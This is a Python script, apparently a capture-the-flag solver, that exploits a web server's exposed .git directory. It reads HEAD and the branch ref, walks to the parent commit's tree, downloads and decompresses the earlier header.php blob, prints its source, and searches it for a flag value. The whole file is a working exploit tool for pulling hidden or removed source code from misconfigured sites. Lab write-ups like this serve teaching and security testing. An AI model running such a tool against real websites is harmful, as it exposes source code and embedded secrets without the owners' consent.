import urllib.request
import urllib.error
import zlib
import sys
import re

HEADER_PHP = "header.php"
DEFAULT_URL = "http://localhost:8011"

def get_content(url):
    try:
        with urllib.request.urlopen(url) as response:
            return response.read()
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error {e.code} for {url}")
        return None
    except Exception as e:
        print(f"[-] Error fetching {url}: {e}")
        return None

def get_git_object(base_url, sha):
    path = f".git/objects/{sha[:2]}/{sha[2:]}"
    data = get_content(f"{base_url}/{path}")
    if data:
        try:
            return zlib.decompress(data)
        except zlib.error:
            print(f"[-] Error decompressing object {sha}")
    return None

def parse_commit_parent(data):
    # Commit format: tree <sha>\nparent <sha>...
    try:
        content = data.split(b'\0', 1)[1].decode('utf-8', errors='ignore')
        match = re.search(r'^parent ([0-9a-f]{40})', content, re.MULTILINE)
        if match:
            return match.group(1)
    except Exception as e:
        print(f"[-] Error parsing commit: {e}")
    return None

def parse_commit_tree(data):
    try:
        content = data.split(b'\0', 1)[1].decode('utf-8', errors='ignore')
        match = re.search(r'^tree ([0-9a-f]{40})', content, re.MULTILINE)
        if match:
            return match.group(1)
    except Exception as e:
        print(f"[-] Error parsing commit tree: {e}")
    return None

def find_file_in_tree(base_url, tree_sha, filename):
    data = get_git_object(base_url, tree_sha)
    if not data:
        return None

    # Tree format: <mode> <name>\0<sha(20 bytes)>
    try:
        content = data.split(b'\0', 1)[1] # Skip type+size header
        while content:
            space_idx = content.find(b' ')
            if space_idx == -1: break

            mode = content[:space_idx]
            null_idx = content.find(b'\0', space_idx)
            name = content[space_idx+1:null_idx].decode('utf-8')
            sha_bytes = content[null_idx+1:null_idx+21]
            sha = sha_bytes.hex()

            if name == filename:
                return sha

            content = content[null_idx+21:]
    except Exception as e:
        print(f"[-] Error parsing tree: {e}")
    return None

def main():
    target_url = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_URL
    target_url = target_url.rstrip('/')

    print(f"[*] Targeting: {target_url}")

    # 1. Get HEAD
    head_data = get_content(f"{target_url}/.git/HEAD")
    if not head_data:
        print("[-] Could not read .git/HEAD")
        return

    ref_match = re.search(r'ref: (.*)', head_data.decode().strip())
    if not ref_match:
        print("[-] HEAD is not a ref")
        return

    ref = ref_match.group(1)
    print(f"[+] HEAD ref: {ref}")

    # 2. Get Ref SHA
    ref_sha_data = get_content(f"{target_url}/.git/{ref}")
    if not ref_sha_data:
        print(f"[-] Could not read .git/{ref}")
        return
    current_commit_sha = ref_sha_data.decode().strip()
    print(f"[+] Current HEAD Commit: {current_commit_sha}")

    # 3. Get Parent Commit (The one before maintenance)
    commit_data = get_git_object(target_url, current_commit_sha)
    if not commit_data: return

    parent_sha = parse_commit_parent(commit_data)
    if not parent_sha:
        print("[-] No parent commit found. Is this the first commit?")
        return
    print(f"[+] Parent Commit (Hidden content): {parent_sha}")

    # 4. Get Tree of Parent Commit
    parent_commit_data = get_git_object(target_url, parent_sha)
    if not parent_commit_data: return

    tree_sha = parse_commit_tree(parent_commit_data)
    if not tree_sha:
        print("[-] Could not find tree for parent commit")
        return
    print(f"[+] Parent Tree: {tree_sha}")

    # 5. Find header.php in Tree
    header_sha = find_file_in_tree(target_url, tree_sha, HEADER_PHP)
    if not header_sha:
        print(f"[-] Could not find {HEADER_PHP} in tree")
        return
    print(f"[+] Found {HEADER_PHP} SHA: {header_sha}")

    # 6. Get File Content
    file_data = get_git_object(target_url, header_sha)
    if file_data:
        content = file_data.split(b'\0', 1)[1].decode('utf-8', errors='ignore')
        print("\n[SUCCESS] Content retrieved:")
        print("-" * 40)
        print(content)
        print("-" * 40)

        flag_match = re.search(r'flag\{[^}]+\}', content)
        if flag_match:
            print(f"\n[!!!] FLAG: {flag_match.group(0)}")
        else:
            flag_var = re.search(r'\$FLAG\s*=\s*["\']([^"\']+)["\']', content)
            if flag_var:
                 print(f"\n[!!!] FLAG: {flag_var.group(1)}")

if __name__ == "__main__":
    main()
